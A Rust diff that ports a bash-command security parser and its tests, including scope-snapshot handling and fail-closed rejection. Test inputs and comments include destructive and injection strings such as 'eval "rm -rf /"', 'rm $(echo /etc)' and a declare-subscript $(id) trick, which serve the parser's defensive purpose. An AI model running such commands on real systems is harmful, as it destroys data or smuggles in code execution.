@@ -277,6 +277,16 @@ lazy_re!(ps4_dollar_brace_re, r"\$\{[A-Za-z_][A-Za-z0-9_]*\}");
 // PS4 safe charset after stripping `${VAR}` refs (ast.ts:1895): A-Za-z0-9, space,
 // `_ + : . / =`, `[`, `]`, and `-` (trailing → literal). `[`/`]` escaped for Rust.
 lazy_re!(ps4_charset_re, r"^[A-Za-z0-9 _+:./=\[\]-]*$");
+// declare/typeset/local flag that changes assignment semantics: -…[niaA]
+// (nameref / integer / array), ast.ts:627.
+lazy_re!(declare_flag_re, r"^-[a-zA-Z]*[niaA]");
+// declare bare positional with an array subscript (`x[…]`), ast.ts:647.
+lazy_re!(declare_subscript_re, r"^[^=]*\[");
+// A `$<ident>` in node.text — a resolved simple_expansion (ast.ts:1350).
+lazy_re!(dollar_ident_re, r"\$[A-Za-z_]");
+// Chars that force shell-escape when rebuilding .text from argv (ast.ts:1353).
+// Backtick, brackets and the metacharacter set; `[`/`]` escaped for Rust.
+lazy_re!(shell_escape_re, "[\"'\\\\ \t\n$`;|&<>(){}*?\\[\\]~#]");
 
 // ── Leaf helpers (ast.ts:94, 213, 2029, 2033, 1937, 2017) ──
 
@@ -482,14 +492,12 @@ pub(crate) enum CatHeredoc {
     None,
 }
 
-/// TS `collectCommands` (ast.ts:482) — the L3 statement driver. **STAND-IN**
-/// until L3 lands: handle the shapes L2's tests exercise (a bare `command` /
-/// `redirected_statement` / `comment`) by recursing, and FAIL CLOSED
-/// (`too_complex`) for everything else. The asymmetric-safety rule means an
-/// unported structural node MUST reject (over-ask), never silently succeed.
-///
-/// L3 replaces this entirely with the full list/pipeline/if/while/for/subshell
-/// scope-snapshot driver.
+/// TS `collectCommands` (ast.ts:482). Recursively collect leaf `command` nodes
+/// from a structural wrapper node. `None` = success; `Some(err)` = fail-closed
+/// on a disallowed node type. Mirrors the varScope-snapshot semantics: `&&`/`;`
+/// carry scope linearly; `||`/`|`/`|&`/`&` reset to the entry snapshot; pipelines
+/// run on a COPY so stages never mutate the caller's scope. Any unhandled node
+/// type falls to the default `too_complex` (over-ask), NEVER silently succeeds.
 #[allow(dead_code)]
 pub(crate) fn collect_commands(
     node: Node,
@@ -497,48 +505,495 @@ pub(crate) fn collect_commands(
     var_scope: &mut HashMap<String, String>,
     src: &[u8],
 ) -> Option<ParseForSecurityResult> {
-    match node.kind() {
-        "command" => {
-            // Inline the L3 `walk_command` dispatch shape via walk_argument et al.
-            match walk_command_stand_in(node, commands, var_scope, src) {
-                ParseForSecurityResult::Simple { commands: cs } => {
-                    commands.extend(cs);
-                    None
+    let kind = node.kind();
+
+    if kind == "command" {
+        // Pass `commands` as the innerCommands accumulator — any $() extracted
+        // during walk_command gets appended alongside the outer command.
+        match walk_command(node, &[], commands, var_scope, src) {
+            ParseForSecurityResult::Simple { commands: cs } => {
+                commands.extend(cs);
+                return None;
+            }
+            other => return Some(other),
+        }
+    }
+
+    if kind == "redirected_statement" {
+        return walk_redirected_statement(node, commands, var_scope, src);
+    }
+
+    if kind == "comment" {
+        return None;
+    }
+
+    if STRUCTURAL_TYPES.contains(&kind) {
+        // SECURITY: `||`, `|`, `|&`, `&` must NOT carry varScope linearly (see
+        // ast.ts:504 for the flag-omission attack). Snapshot the incoming scope;
+        // reset to it after those separators. `&&`/`;` DO carry scope.
+        let is_pipeline = kind == "pipeline";
+        let mut needs_snapshot = false;
+        if !is_pipeline {
+            for c in children(node) {
+                if c.kind() == "||" || c.kind() == "&" {
+                    needs_snapshot = true;
+                    break;
                 }
-                other => Some(other),
             }
         }
-        "comment" => None,
-        "program" | "list" => {
-            for child in children(node) {
+        let snapshot: Option<HashMap<String, String>> =
+            if needs_snapshot { Some(var_scope.clone()) } else { None };
+        // For `pipeline`, ALL stages run in subshells → start with a COPY so
+        // nothing mutates the caller's scope. For `list`/`program`, the `&&`/`;`
+        // chain mutates the caller's scope; fork only on `||`/`&`.
+        let mut owned_scope: Option<HashMap<String, String>> =
+            if is_pipeline { Some(var_scope.clone()) } else { None };
+        for child in children(node) {
+            let ck = child.kind();
+            if SEPARATOR_TYPES.contains(&ck) {
+                if ck == "||" || ck == "|" || ck == "|&" || ck == "&" {
+                    // `|`/`|&` only appear under `pipeline`; `||`/`&` under list.
+                    let base = snapshot.as_ref().unwrap_or(&*var_scope);
+                    owned_scope = Some(base.clone());
+                }
+                continue;
+            }
+            let scope: &mut HashMap<String, String> =
+                owned_scope.as_mut().unwrap_or(var_scope);
+            if let Some(err) = collect_commands(child, commands, scope, src) {
+                return Some(err);
+            }
+        }
+        return None;
+    }
+
+    if kind == "negated_command" {
+        // `! cmd` inverts exit code only. Recurse into the wrapped command.
+        for child in children(node) {
+            if child.kind() == "!" {
+                continue;
+            }
+            return collect_commands(child, commands, var_scope, src);
+        }
+        return None;
+    }
+
+    if kind == "declaration_command" {
+        // `export`/`local`/`readonly`/`declare`/`typeset`.
+        let mut argv: Vec<String> = Vec::new();
+        for child in children(node) {
+            match child.kind() {
+                "export" | "local" | "readonly" | "declare" | "typeset" => {
+                    argv.push(node_text(child, src).to_string());
+                }
+                "word" | "number" | "raw_string" | "string" | "concatenation" => {
+                    let arg = match walk_argument(Some(child), src, commands, var_scope) {
+                        Ok(s) => s,
+                        Err(e) => return Some(e),
+                    };
+                    // SECURITY: declare/typeset/local flags that change assignment
+                    // semantics (-n nameref, -i integer, -a/-A array) break the
+                    // static model. Check the RESOLVED arg.
+                    if (argv.first().map(String::as_str) == Some("declare")
+                        || argv.first().map(String::as_str) == Some("typeset")
+                        || argv.first().map(String::as_str) == Some("local"))
+                        && declare_flag_re().is_match(&arg)
+                    {
+                        return Some(ParseForSecurityResult::TooComplex {
+                            reason: format!(
+                                "declare flag {arg} changes assignment semantics (nameref/integer/array)"
+                            ),
+                        });
+                    }
+                    // SECURITY: bare positional with a subscript also evaluates
+                    // (`declare 'x[$(id)]=val'` runs $(id) in the subscript).
+                    if (argv.first().map(String::as_str) == Some("declare")
+                        || argv.first().map(String::as_str) == Some("typeset")
+                        || argv.first().map(String::as_str) == Some("local"))
+                        && !arg.starts_with('-')
+                        && declare_subscript_re().is_match(&arg)
+                    {
+                        return Some(ParseForSecurityResult::TooComplex {
+                            reason: format!(
+                                "declare positional '{arg}' contains array subscript — bash evaluates $(cmd) in subscripts"
+                            ),
+                        });
+                    }
+                    argv.push(arg);
+                }
+                "variable_assignment" => {
+                    let ev = match walk_variable_assignment(child, commands, var_scope, src) {
+                        Ok(ev) => ev,
+                        Err(e) => return Some(e),
+                    };
+                    // export/declare assignments populate the scope so later $VAR
+                    // refs resolve.
+                    let pair = format!("{}={}", ev.name, ev.value);
+                    apply_var_to_scope(var_scope, &ev.name, &ev.value, ev.is_append);
+                    argv.push(pair);
+                }
+                "variable_name" => {
+                    // `export FOO` — bare name, no assignment.
+                    argv.push(node_text(child, src).to_string());
+                }
+                _ => return Some(too_complex(child)),
+            }
+        }
+        commands.push(SimpleCommand {
+            argv,
+            env_vars: Vec::new(),
+            redirects: Vec::new(),
+            text: node_text(node, src).to_string(),
+        });
+        return None;
+    }
+
+    if kind == "variable_assignment" {
+        // Bare `VAR=value` at statement level — inert, no command pushed.
+        let ev = match walk_variable_assignment(node, commands, var_scope, src) {
+            Ok(ev) => ev,
+            Err(e) => return Some(e),
+        };
+        apply_var_to_scope(var_scope, &ev.name, &ev.value, ev.is_append);
+        return None;
+    }
+
+    if kind == "for_statement" {
+        let mut loop_var: Option<String> = None;
+        let mut do_group: Option<Node> = None;
+        for child in children(node) {
+            match child.kind() {
+                "variable_name" => loop_var = Some(node_text(child, src).to_string()),
+                "do_group" => do_group = Some(child),
+                "for" | "in" | "select" | ";" => {}
+                "command_substitution" => {
+                    if let Some(err) =
+                        collect_command_substitution(child, commands, var_scope, src)
+                    {
+                        return Some(err);
+                    }
+                }
+                _ => {
+                    // Iteration values: validated (value discarded; body uses
+                    // VAR_PLACEHOLDER regardless).
+                    if let Err(e) = walk_argument(Some(child), src, commands, var_scope) {
+                        return Some(e);
+                    }
+                }
+            }
+        }
+        let (loop_var, do_group) = match (loop_var, do_group) {
+            (Some(v), Some(g)) => (v, g),
+            _ => return Some(too_complex(node)),
+        };
+        // SECURITY: PS4/IFS as loop var bypasses assignment validation.
+        if loop_var == "PS4" || loop_var == "IFS" {
+            return Some(ParseForSecurityResult::TooComplex {
+                reason: format!("{loop_var} as loop variable bypasses assignment validation"),
+            });
+        }
+        // Loop var is ALWAYS unknown-value (VAR_PLACEHOLDER) in the REAL scope;
+        // body uses a COPY so body assignments don't leak past `done`.
+        var_scope.insert(loop_var, VAR_PLACEHOLDER.to_string());
+        let mut body_scope = var_scope.clone();
+        for c in children(do_group) {
+            if matches!(c.kind(), "do" | "done" | ";") {
+                continue;
+            }
+            if let Some(err) = collect_commands(c, commands, &mut body_scope, src) {
+                return Some(err);
+            }
+        }
+        return None;
+    }
+
+    if kind == "if_statement" || kind == "while_statement" {
+        let mut seen_then = false;
+        for child in children(node) {
+            match child.kind() {
+                "if" | "fi" | "else" | "elif" | "while" | "until" | ";" => continue,
+                "then" => {
+                    seen_then = true;
+                    continue;
+                }
+                "do_group" => {
+                    // while body: scope COPY (body assignments don't leak past
+                    // done); inherits any `read VAR` tracking already in the real
+                    // scope from the condition.
+                    let mut body_scope = var_scope.clone();
+                    for c in children(child) {
+                        if matches!(c.kind(), "do" | "done" | ";") {
+                            continue;
+                        }
+                        if let Some(err) = collect_commands(c, commands, &mut body_scope, src) {
+                            return Some(err);
+                        }
+                    }
+                    continue;
+                }
+                "elif_clause" | "else_clause" => {
+                    let mut branch_scope = var_scope.clone();
+                    for c in children(child) {
+                        if matches!(c.kind(), "elif" | "else" | "then" | ";") {
+                            continue;
+                        }
+                        if let Some(err) = collect_commands(c, commands, &mut branch_scope, src) {
+                            return Some(err);
+                        }
+                    }
+                    continue;
+                }
+                _ => {}
+            }
+            // Condition (seen_then=false) uses REAL varScope; then-body uses a COPY.
+            let before = commands.len();
+            if seen_then {
+                let mut copy = var_scope.clone();
+                if let Some(err) = collect_commands(child, commands, &mut copy, src) {
+                    return Some(err);
+                }
+            } else {
                 if let Some(err) = collect_commands(child, commands, var_scope, src) {
                     return Some(err);
                 }
+                // `while read VAR`: track condition `read VAR` names in REAL scope
+                // (value UNKNOWN → VAR_PLACEHOLDER) so the body COPY inherits them.
+                for i in before..commands.len() {
+                    let c = &commands[i];
+                    if c.argv.first().map(String::as_str) != Some("read") {
+                        continue;
+                    }
+                    let names: Vec<String> = c.argv[1..]
+                        .iter()
+                        .filter(|a| {
+                            !a.starts_with('-') && valid_var_name_re().is_match(a)
+                        })
+                        .cloned()
+                        .collect();
+                    for a in names {
+                        // SECURITY: fail closed when a tracked literal would be
+                        // overwritten by a `read` that may not execute.
+                        if let Some(existing) = var_scope.get(&a) {
+                            if !contains_any_placeholder(existing) {
+                                return Some(ParseForSecurityResult::TooComplex {
+                                    reason: format!(
+                                        "'read {a}' in condition may not execute (||/pipeline/subshell); cannot prove it overwrites tracked literal '{existing}'"
+                                    ),
+                                });
+                            }
+                        }
+                        var_scope.insert(a, VAR_PLACEHOLDER.to_string());
+                    }
+                }
             }
-            None
         }
-        _ => Some(too_complex(node)),
+        return None;
+    }
+
+    if kind == "subshell" {
+        // `(cmd1; cmd2)` — isolated scope. Use a COPY of varScope.
+        let mut inner_scope = var_scope.clone();
+        for child in children(node) {
+            if matches!(child.kind(), "(" | ")") {
+                continue;
+            }
+            if let Some(err) = collect_commands(child, commands, &mut inner_scope, src) {
+                return Some(err);
+            }
+        }
+        return None;
+    }
+
+    if kind == "test_command" {
+        // `[[ EXPR ]]` / `[ EXPR ]` — push synthetic command with argv[0]='[['.
+        let mut argv: Vec<String> = vec!["[[".to_string()];
+        for child in children(node) {
+            if matches!(child.kind(), "[[" | "]]" | "[" | "]") {
+                continue;
+            }
+            if let Some(err) = walk_test_expr(child, src, &mut argv, commands, var_scope) {
+                return Some(err);
+            }
+        }
+        commands.push(SimpleCommand {
+            argv,
+            env_vars: Vec::new(),
+            redirects: Vec::new(),
+            text: node_text(node, src).to_string(),
+        });
+        return None;
+    }
+
+    if kind == "unset_command" {
+        // `unset FOO BAR`, `unset -f func`. Safe — only removes vars/functions.
+        let mut argv: Vec<String> = Vec::new();
+        for child in children(node) {
+            match child.kind() {
+                "unset" => argv.push(node_text(child, src).to_string()),
+                "variable_name" => {
+                    let name = node_text(child, src).to_string();
+                    argv.push(name.clone());
+                    // SECURITY: remove from varScope so later `$VAR` rejects.
+                    var_scope.remove(&name);
+                }
+                "word" => {
+                    let arg = match walk_argument(Some(child), src, commands, var_scope) {
+                        Ok(s) => s,
+                        Err(e) => return Some(e),
+                    };
+                    argv.push(arg);
+                }
+                _ => return Some(too_complex(child)),
+            }
+        }
+        commands.push(SimpleCommand {
+            argv,
+            env_vars: Vec::new(),
+            redirects: Vec::new(),
+            text: node_text(node, src).to_string(),
+        });
+        return None;
+    }
+
+    Some(too_complex(node))
+}
+
+/// TS `walkRedirectedStatement` (ast.ts:1017). A `redirected_statement` wraps a
+/// command (or pipeline) plus `file_redirect`/`heredoc_redirect` children.
+/// Extract redirects, walk the inner command, attach redirects to the LAST
+/// command. `None` = ok; `Some(err)` = fail-closed.
+#[allow(dead_code)]
+pub(crate) fn walk_redirected_statement(
+    node: Node,
+    commands: &mut Vec<SimpleCommand>,
+    var_scope: &mut HashMap<String, String>,
+    src: &[u8],
+) -> Option<ParseForSecurityResult> {
+    let mut redirects: Vec<Redirect> = Vec::new();
+    let mut inner_command: Option<Node> = None;
+
+    for child in children(node) {
+        match child.kind() {
+            "file_redirect" => match walk_file_redirect(child, src, commands, var_scope) {
+                Ok(r) => redirects.push(r),
+                Err(e) => return Some(e),
+            },
+            "heredoc_redirect" => {
+                if let Some(r) = walk_heredoc_redirect(child, src) {
+                    return Some(r);
+                }
+            }
+            "command" | "pipeline" | "list" | "negated_command" | "declaration_command"
+            | "unset_command" => {
+                inner_command = Some(child);
+            }
+            _ => return Some(too_complex(child)),
+        }
+    }
+
+    let inner_command = match inner_command {
+        Some(c) => c,
+        None => {
+            // `> file` alone — represent as a command with empty argv.
+            commands.push(SimpleCommand {
+                argv: Vec::new(),
+                env_vars: Vec::new(),
+                redirects,
+                text: node_text(node, src).to_string(),
+            });
+            return None;
+        }
+    };
+
+    let before = commands.len();
+    if let Some(err) = collect_commands(inner_command, commands, var_scope, src) {
+        return Some(err);
+    }
+    if commands.len() > before && !redirects.is_empty() {
+        if let Some(last) = commands.last_mut() {
+            last.redirects.extend(redirects);
+        }
+    }
+    None
+}
+
+/// TS `walkFileRedirect` (ast.ts:1071). Extract operator + target from a
+/// `file_redirect` node. The target must be a static word/string. `Ok(Redirect)`
+/// on success; `Err(TooComplex)` fail-closed.
+#[allow(dead_code)]
+pub(crate) fn walk_file_redirect(
+    node: Node,
+    src: &[u8],
+    inner_commands: &mut Vec<SimpleCommand>,
+    var_scope: &mut HashMap<String, String>,
+) -> Result<Redirect, ParseForSecurityResult> {
+    let mut op: Option<String> = None;
+    let mut target: Option<String> = None;
+    let mut fd: Option<i64> = None;
+
+    for child in children(node) {
+        let ck = child.kind();
+        if ck == "file_descriptor" {
+            fd = node_text(child, src).parse::<i64>().ok();
+        } else if REDIRECT_OPS.contains(&ck) {
+            op = Some(ck.to_string());
+        } else if ck == "word" || ck == "number" {
+            // SECURITY: `number` nodes can carry expansion children via the
+            // `NN#<expansion>` quirk. Plain word/number have zero children.
+            if !children(child).is_empty() {
+                return Err(too_complex(child));
+            }
+            if brace_expansion_re().is_match(node_text(child, src)) {
+                return Err(too_complex(child));
+            }
+            // Bash quote removal: `\X` → `X` (JS `/\\(.)/g`, `.` excludes \n).
+            target = Some(unescape_word(node_text(child, src)));
+        } else if ck == "raw_string" {
+            target = Some(strip_raw_string(node_text(child, src)));
+        } else if ck == "string" {
+            match walk_string(child, src, inner_commands, var_scope) {
+                Ok(s) => target = Some(s),
+                Err(e) => return Err(e),
+            }
+        } else if ck == "concatenation" {
+            match walk_argument(Some(child), src, inner_commands, var_scope) {
+                Ok(s) => target = Some(s),
+                Err(e) => return Err(e),
+            }
+        } else {
+            return Err(too_complex(child));
+        }
+    }
+
+    match (op, target) {
+        (Some(op), Some(target)) => Ok(Redirect { op, target, fd }),
+        _ => Err(ParseForSecurityResult::TooComplex {
+            reason: "Unrecognized redirect shape".to_string(),
+        }),
     }
 }
 
-/// Minimal `walk_command` for the [`collect_commands`] stand-in: extract argv /
-/// env_vars / redirects from a `command` node using the L2 walkers. FAIL CLOSED
-/// on any child kind not handled (matching TS `walkCommand`'s default →
-/// `tooComplex`). The full L3 `walk_command` (with the .text rebuild) replaces
-/// this; here it exists only so L2's cmdsub-extraction tests have a leaf driver.
+/// TS `walkCommand` (ast.ts:1237). Walk a `command` node and extract argv /
+/// env_vars / redirects via the L2 walkers. Any child type not explicitly
+/// handled → `too_complex` (over-ask). Rebuilds `.text` from argv when a `$VAR`
+/// was resolved or a newline is present (rule-matching fidelity).
 #[allow(dead_code)]
-fn walk_command_stand_in(
+pub(crate) fn walk_command(
     node: Node,
+    extra_redirects: &[Redirect],
     inner_commands: &mut Vec<SimpleCommand>,
     var_scope: &mut HashMap<String, String>,
     src: &[u8],
 ) -> ParseForSecurityResult {
     let mut argv: Vec<String> = Vec::new();
     let mut env_vars: Vec<(String, String)> = Vec::new();
-    let mut redirects: Vec<Redirect> = Vec::new();
+    let mut redirects: Vec<Redirect> = extra_redirects.to_vec();
+
     for child in children(node) {
         match child.kind() {
             "variable_assignment" => {
+                // SECURITY: env-prefix assignments (`VAR=x cmd`) are command-local
+                // in bash — do NOT add to the global varScope.
                 match walk_variable_assignment(child, inner_commands, var_scope, src) {
                     Ok(ev) => env_vars.push((ev.name, ev.value)),
                     Err(e) => return e,
@@ -552,24 +1007,54 @@ fn walk_command_stand_in(
                 }
             }
             "word" | "number" | "raw_string" | "string" | "concatenation"
-            | "arithmetic_expansion" => match walk_argument(Some(child), src, inner_commands, var_scope) {
-                Ok(s) => argv.push(s),
-                Err(e) => return e,
-            },
-            "simple_expansion" => match resolve_simple_expansion(child, src, var_scope, false) {
-                Ok(s) => argv.push(s),
+            | "arithmetic_expansion" => {
+                match walk_argument(Some(child), src, inner_commands, var_scope) {
+                    Ok(s) => argv.push(s),
+                    Err(e) => return e,
+                }
+            }
+            // NOTE: bare command_substitution at arg position is INTENTIONALLY
+            // unhandled → default → too_complex (the $() output IS the argument).
+            "simple_expansion" => {
+                match resolve_simple_expansion(child, src, var_scope, false) {
+                    Ok(s) => argv.push(s),
+                    Err(e) => return e,
+                }
+            }
+            "file_redirect" => match walk_file_redirect(child, src, inner_commands, var_scope) {
+                Ok(r) => redirects.push(r),
                 Err(e) => return e,
             },
             "herestring_redirect" => {
-                if let Some(e) = walk_herestring_redirect(child, src, inner_commands, var_scope) {
+                if let Some(e) =
+                    walk_herestring_redirect(child, src, inner_commands, var_scope)
+                {
                     return e;
                 }
             }
             _ => return too_complex(child),
         }
     }
-    let _ = &mut redirects;
-    let text = node_text(node, src).to_string();
+
+    // SECURITY: rebuild .text from argv when node.text contains `$<ident>` (a
+    // resolved simple_expansion) or a newline (line continuations). Shell-escape
+    // each arg. See ast.ts:1316-1358 for the deny-rule-matching rationale.
+    let raw = node_text(node, src);
+    let text = if dollar_ident_re().is_match(raw) || raw.contains('\n') {
+        argv.iter()
+            .map(|a| {
+                if a.is_empty() || shell_escape_re().is_match(a) {
+                    format!("'{}'", a.replace('\'', "'\\''"))
+                } else {
+                    a.clone()
+                }
+            })
+            .collect::<Vec<_>>()
+            .join(" ")
+    } else {
+        raw.to_string()
+    };
+
     ParseForSecurityResult::Simple {
         commands: vec![SimpleCommand {
             argv,
@@ -1178,11 +1663,11 @@ pub fn pre_check_too_complex(cmd: &str) -> Option<&'static str> {
 /// Parse a bash command and extract a flat list of simple commands for security
 /// analysis (TS `parseForSecurity` / `parseForSecurityFromAst`).
 ///
-/// PIECE 2a: empty → `Simple{[]}`; a pre-check differential → `TooComplex`;
-/// otherwise `ParseUnavailable` (STAND-IN until the AST extraction is ported —
-/// the caller then keeps the legacy battery, i.e. no behavior change). The
-/// `walkProgram`/`collectCommands` extraction replaces the stand-in in a later
-/// piece.
+/// Empty → `Simple{[]}`; a pre-check differential → `TooComplex`; parser
+/// unavailable / over-length → `ParseUnavailable` (the caller keeps the legacy
+/// battery); otherwise the AST is walked via [`walk_program`] →
+/// `Simple{commands}` | `TooComplex{reason}`. The security asymmetry holds: any
+/// unhandled/ambiguous node fails closed (over-ask), never silently `Simple`.
 #[must_use]
 pub fn parse_for_security(cmd: &str) -> ParseForSecurityResult {
     // TS: `if (cmd === '') return { kind: 'simple', commands: [] }`.
@@ -1195,34 +1680,39 @@ pub fn parse_for_security(cmd: &str) -> ParseForSecurityResult {
             reason: reason.to_string(),
         };
     }
+    // TS `parseForSecurity`: `root === null => parse-unavailable`. Over-length /
+    // unparseable → `parse_raw` returns `None` → `ParseUnavailable` (the caller
+    // keeps the legacy battery), exactly like TS — NOT routed to `TooComplex`.
+    let tree = match crate::bash_tree_sitter::parse_raw(cmd) {
+        Some(t) => t,
+        None => return ParseForSecurityResult::ParseUnavailable,
+    };
     // TS: `const trimmed = cmd.trim(); if (trimmed === '') return simple[]`.
     if cmd.trim().is_empty() {
         return ParseForSecurityResult::Simple { commands: Vec::new() };
     }
-    // STAND-IN (through L1): the AST → simple-command extraction (`walk_program`
-    // / `collect_commands` / …) is not landed yet, so signal parse-unavailable →
-    // the caller keeps the legacy battery (no behavior change).
-    //
-    // L1 has wired the parser-availability side: a later layer replaces this line
-    // with
-    //
-    //   let tree = match crate::bash_tree_sitter::parse_raw(cmd) {
-    //       Some(t) => t,
-    //       None => return ParseForSecurityResult::ParseUnavailable,
-    //   };
-    //   walk_program(tree.root_node(), cmd.as_bytes())
-    //
-    // matching TS `root === null => parse-unavailable`. Over-length / unparseable
-    // → `parse_raw` returns `None` → `ParseUnavailable` (legacy battery), exactly
-    // like TS — NOT routed to `TooComplex`.
-    //
     // DEFER (PARSE_ABORTED): TS fail-CLOSES (`TooComplex`, nodeType `PARSE_ABORT`,
     // reason "Parser aborted (timeout or resource limit) — possible adversarial
     // input") when the parse hits the node/time budget. tree-sitter-bash 0.25.1
     // here has no budget (see `bash_tree_sitter::parse_raw`), so that branch is
     // UNREACHABLE today; wire it only if a parse-timeout API is added — and use
     // the real 2.1.195 binary string then, which is NEWER than the TS source.
-    ParseForSecurityResult::ParseUnavailable
+    walk_program(tree.root_node(), cmd.as_bytes())
+}
+
+/// TS `walkProgram` (ast.ts:462). Drive [`collect_commands`] over the program
+/// root with a fresh `var_scope`. The ERROR-node check is folded into
+/// `collect_commands` — any unhandled node type (including `ERROR`) falls through
+/// to `too_complex` in the default branch. `Simple{commands}` on success;
+/// the propagated `TooComplex` otherwise.
+#[must_use]
+pub fn walk_program(root: Node, src: &[u8]) -> ParseForSecurityResult {
+    let mut commands: Vec<SimpleCommand> = Vec::new();
+    let mut var_scope: HashMap<String, String> = HashMap::new();
+    if let Some(err) = collect_commands(root, &mut commands, &mut var_scope, src) {
+        return err;
+    }
+    ParseForSecurityResult::Simple { commands }
 }
 
 #[cfg(test)]
@@ -1414,9 +1904,15 @@ mod tests {
     }
 
     #[test]
-    fn plain_command_is_stand_in_parse_unavailable() {
-        // Until the AST extraction is ported, an analyzable command falls back.
-        assert_eq!(parse_for_security("ls -la"), ParseForSecurityResult::ParseUnavailable);
+    fn plain_command_extracts_simple() {
+        // L3: an analyzable command is now extracted to Simple{commands}.
+        match parse_for_security("ls -la") {
+            ParseForSecurityResult::Simple { commands } => {
+                assert_eq!(commands.len(), 1);
+                assert_eq!(commands[0].argv, vec!["ls", "-la"]);
+            }
+            other => panic!("expected Simple, got {other:?}"),
+        }
         assert_eq!(pre_check_too_complex("ls -la"), None);
         assert_eq!(pre_check_too_complex("git status"), None);
     }
@@ -1733,5 +2229,234 @@ EOF
         // Quoted JSON payload: the `{` is inside quotes → masked → NOT flagged.
         assert_eq!(pre_check_too_complex(r#"curl -d '{"k":"v"}'"#), None);
         assert_eq!(pre_check_too_complex(r#"curl -d "{\"k\":\"v\"}""#), None);
+    }
+
+    // ── L3: walk_command / walk_redirected_statement / walk_file_redirect /
+    //        collect_commands / walk_program / parse_for_security ──
+
+    /// Run the full `parse_for_security` pipeline. `Ok(commands)` on Simple;
+    /// `Err(reason)` on TooComplex; panic on ParseUnavailable (none of the L3
+    /// inputs trip that).
+    fn pfs(cmd: &str) -> Result<Vec<SimpleCommand>, String> {
+        match parse_for_security(cmd) {
+            ParseForSecurityResult::Simple { commands } => Ok(commands),
+            ParseForSecurityResult::TooComplex { reason } => Err(reason),
+            ParseForSecurityResult::ParseUnavailable => {
+                panic!("unexpected ParseUnavailable for {cmd:?}")
+            }
+        }
+    }
+
+    /// Convenience: just the argv vectors.
+    fn pfs_argvs(cmd: &str) -> Result<Vec<Vec<String>>, String> {
+        pfs(cmd).map(|cs| cs.into_iter().map(|c| c.argv).collect())
+    }
+
+    #[test]
+    fn l3_simple_command_argv_env_redirect() {
+        // Plain command.
+        let cs = pfs("git status").expect("simple");
+        assert_eq!(cs.len(), 1);
+        assert_eq!(cs[0].argv, vec!["git", "status"]);
+        assert!(cs[0].env_vars.is_empty());
+        assert!(cs[0].redirects.is_empty());
+        assert_eq!(cs[0].text, "git status");
+
+        // Env prefix → env_vars, NOT a tracked var (command-local).
+        let cs = pfs("FOO=bar ls -l").expect("simple");
+        assert_eq!(cs[0].argv, vec!["ls", "-l"]);
+        assert_eq!(cs[0].env_vars, vec![("FOO".to_string(), "bar".to_string())]);
+
+        // File redirect on the last command.
+        let cs = pfs("echo hi > /tmp/out").expect("simple");
+        assert_eq!(cs[0].argv, vec!["echo", "hi"]);
+        assert_eq!(cs[0].redirects.len(), 1);
+        assert_eq!(cs[0].redirects[0].op, ">");
+        assert_eq!(cs[0].redirects[0].target, "/tmp/out");
+
+        // fd-prefixed redirect.
+        let cs = pfs("ls 2> /tmp/err").expect("simple");
+        assert_eq!(cs[0].redirects[0].op, ">");
+        assert_eq!(cs[0].redirects[0].fd, Some(2));
+    }
+
+    #[test]
+    fn l3_pipeline_extracts_each_stage() {
+        let argvs = pfs_argvs("ls -la | grep foo").expect("simple");
+        assert_eq!(argvs.len(), 2);
+        assert_eq!(argvs[0], vec!["ls", "-la"]);
+        assert_eq!(argvs[1], vec!["grep", "foo"]);
+    }
+
+    #[test]
+    fn l3_list_and_separators() {
+        // `&&` carries scope linearly: VAR=push then `git $SUB` resolves.
+        let argvs = pfs_argvs("VAR=safe && echo $VAR").expect("simple");
+        // VAR=safe is a bare assignment (no command pushed), echo resolves $VAR.
+        assert_eq!(argvs.len(), 1);
+        assert_eq!(argvs[0], vec!["echo", "safe"]);
+    }
+
+    #[test]
+    fn l3_flag_omission_attack_rejected() {
+        // SECURITY: `true || FLAG=x && cmd $FLAG` — the `||` RHS may not run, so
+        // FLAG is NOT carried across the `||`. `$FLAG` then resolves against the
+        // post-`||` snapshot (FLAG unset) → bare $FLAG → too-complex (over-ask).
+        let r = pfs("true || FLAG=--dry-run && rm $FLAG");
+        assert!(r.is_err(), "flag-omission must not be Simple: {r:?}");
+    }
+
+    #[test]
+    fn l3_subshell_extracts_inner() {
+        let argvs = pfs_argvs("(cd /tmp && ls)").expect("simple");
+        assert_eq!(argvs.len(), 2);
+        assert_eq!(argvs[0], vec!["cd", "/tmp"]);
+        assert_eq!(argvs[1], vec!["ls"]);
+    }
+
+    #[test]
+    fn l3_command_substitution_in_string_extracts_inner() {
+        // Inner extracted first, then outer with placeholder.
+        let argvs = pfs_argvs(r#"echo "rev: $(git rev-parse HEAD)""#).expect("simple");
+        assert_eq!(argvs.len(), 2);
+        assert_eq!(argvs[0], vec!["git", "rev-parse", "HEAD"]);
+        assert_eq!(argvs[1][0], "echo");
+    }
+
+    #[test]
+    fn l3_bare_cmdsub_arg_rejected() {
+        // `$()` output IS the argument → must reject (placeholder would hide path).
+        assert_eq!(
+            pfs("rm $(echo /etc)"),
+            Err("Contains command_substitution".to_string())
+        );
+    }
+
+    #[test]
+    fn l3_process_substitution_rejected() {
+        // process_substitution is in DANGEROUS_TYPES → "Contains process_substitution".
+        assert_eq!(
+            pfs("diff <(ls) <(ls)"),
+            Err("Contains process_substitution".to_string())
+        );
+    }
+
+    #[test]
+    fn l3_brace_expansion_rejected_structurally() {
+        // ⚠️ GRAMMAR DIVERGENCE: tsb-0.25.1 tokenizes `{a,b}` into a
+        // `concatenation` whose text is `{a,b}` — the word-level check is dead, so
+        // this is caught by walk_argument's concatenation brace check.
+        assert_eq!(
+            pfs("echo {a,b}"),
+            Err("Brace expansion".to_string())
+        );
+        // `{a..c}` range form.
+        assert_eq!(
+            pfs("echo {a..c}"),
+            Err("Brace expansion".to_string())
+        );
+        // Brace expansion as a redirect target is also rejected.
+        let r = pfs("echo x > {a,b}");
+        assert!(r.is_err(), "brace redirect target must reject: {r:?}");
+    }
+
+    #[test]
+    fn l3_eval_like_builtins_are_simple_at_parse_stage() {
+        // PARITY NOTE: at the parseForSecurity stage, `eval`/`source`/`.`/`exec`
+        // are plain `command` nodes → Simple with argv[0]=the builtin. The
+        // EVAL_LIKE_BUILTINS rejection lives in the LATER `checkSemantics` stage
+        // (ast.ts:2626), which is NOT part of parse_for_security. We assert the
+        // faithful parse-stage behavior (Simple), not a stage we don't own.
+        assert_eq!(pfs_argvs("eval \"rm -rf /\"").expect("simple")[0], vec!["eval", "rm -rf /"]);
+        assert_eq!(pfs_argvs("source ./x.sh").expect("simple")[0], vec!["source", "./x.sh"]);
+        assert_eq!(pfs_argvs(". ./x.sh").expect("simple")[0], vec![".", "./x.sh"]);
